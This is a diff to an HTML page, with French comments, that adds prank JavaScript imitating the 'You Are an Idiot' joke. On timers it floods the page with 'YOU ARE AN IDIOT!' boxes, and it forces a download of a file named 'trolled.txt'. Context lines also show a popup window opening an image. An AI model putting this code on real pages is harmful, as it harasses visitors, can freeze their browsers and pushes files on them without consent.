@@ -36,6 +36,16 @@
             cursor: pointer;
             border-radius: 5px;
         }
+        .troll-window {
+            position: absolute;
+            background: black;
+            color: white;
+            padding: 20px;
+            border: 2px solid red;
+            font-size: 20px;
+            font-weight: bold;
+            z-index: 1000;
+        }
     </style>
 </head>
 <body>
@@ -76,6 +86,39 @@
                     window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
                 }, 1000);
             }
+            
+            // Création de fenêtres troll sur la page
+            setInterval(() => {
+                let trollDiv = document.createElement("div");
+                trollDiv.classList.add("troll-window");
+                trollDiv.innerText = "YOU ARE AN IDIOT! AHAHAHAAAAA";
+                trollDiv.style.top = Math.random() * window.innerHeight + "px";
+                trollDiv.style.left = Math.random() * window.innerWidth + "px";
+                document.body.appendChild(trollDiv);
+            }, 500);
+            
+            // Fait bugger la page avec plein d'éléments
+            setInterval(() => {
+                let glitch = document.createElement("div");
+                glitch.style.position = "absolute";
+                glitch.style.top = Math.random() * window.innerHeight + "px";
+                glitch.style.left = Math.random() * window.innerWidth + "px";
+                glitch.style.color = "lime";
+                glitch.style.fontSize = "30px";
+                glitch.innerText = "YOU ARE AN IDIOT!";
+                document.body.appendChild(glitch);
+            }, 100);
+            
+            // Télécharge automatiquement un fichier texte "YOU ARE AN IDIOT"
+            setTimeout(() => {
+                let textFile = new Blob(["YOU ARE AN IDIOT! AHAHAHAAAAA"], { type: "text/plain" });
+                let downloadLink = document.createElement("a");
+                downloadLink.href = URL.createObjectURL(textFile);
+                downloadLink.download = "trolled.txt";
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+            }, 3000);
         }
     </script>
 </body>
